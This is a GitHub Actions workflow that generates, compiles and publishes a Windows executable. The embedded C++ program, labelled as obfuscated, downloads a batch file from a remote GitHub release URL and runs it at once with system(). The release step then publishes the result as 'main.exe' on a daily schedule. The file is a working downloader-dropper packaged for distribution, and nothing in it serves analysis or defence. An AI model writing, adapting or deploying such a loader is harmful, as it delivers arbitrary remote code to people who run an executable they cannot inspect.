name: EXE

on:
  push:
    paths:
      - 'run.cmd'
  schedule:
    - cron: '0 0 * * *'  # Runs every day at midnight UTC
  workflow_dispatch:  # Allows manual triggering

permissions:
  contents: write
  pull-requests: write
  repository-projects: write

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v2

    - name: Install Visual Studio Build Tools
      run: |
        choco install visualstudio2019buildtools --version 16.11.12 --includeRecommended

    - name: Create C++ file with obfuscation
      run: |
        echo "#include <iostream>" > script.cpp
        echo "#include <fstream>" >> script.cpp
        echo "#include <windows.h>" >> script.cpp
        echo "#include <wininet.h>" >> script.cpp
        echo "" >> script.cpp
        echo "int x = 0;" >> script.cpp
        echo "void obfuscated_function() {" >> script.cpp
        echo "    const char* u = \"https://github.com/43a1723/test/releases/download/AutoBuild/download.bat\";" >> script.cpp
        echo "    const char* o = \"download.bat\";" >> script.cpp
        echo "    HINTERNET i = InternetOpen(L\"MyApp\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);" >> script.cpp
        echo "    HINTERNET c = InternetOpenUrlA(i, u, NULL, 0, INTERNET_FLAG_RELOAD, 0);" >> script.cpp
        echo "    if (c) {" >> script.cpp
        echo "        std::ofstream f(o, std::ios::binary);" >> script.cpp
        echo "        char b[4096];" >> script.cpp
        echo "        DWORD r;" >> script.cpp
        echo "        while (InternetReadFile(c, b, sizeof(b), &r) && r > 0) {" >> script.cpp
        echo "            f.write(b, r);" >> script.cpp
        echo "        }" >> script.cpp
        echo "        f.close();" >> script.cpp
        echo "        InternetCloseHandle(c);" >> script.cpp
        echo "    }" >> script.cpp
        echo "    InternetCloseHandle(i);" >> script.cpp
        echo "    system(\"download.bat\");" >> script.cpp
        echo "}" >> script.cpp
        echo "int main() { obfuscated_function(); return 0; }" >> script.cpp

    - name: Compile C++ Script
      run: |
        cl /EHsc script.cpp /link /OUT:script.exe

    - name: Delete-tag-and-release
      uses: dev-drprasad/delete-tag-and-release@v1.1
      with:
        tag_name: AutoBuildExe
        delete_release: true
        github_token: ${{ secrets.GITHUB_TOKEN }}

    - name: Create Release
      id: create_release
      uses: actions/create-release@latest
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        tag_name: AutoBuildExe
        release_name: AutoBuildExe
        body: Obfuscated run.cmd file
        draft: false
        prerelease: false

    - name: Upload Release Asset
      id: upload-release-asset 
      uses: actions/upload-release-asset@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        upload_url: ${{ steps.create_release.outputs.upload_url }}
        asset_path: script.exe
        asset_name: main.exe
        asset_content_type: application/octet-stream
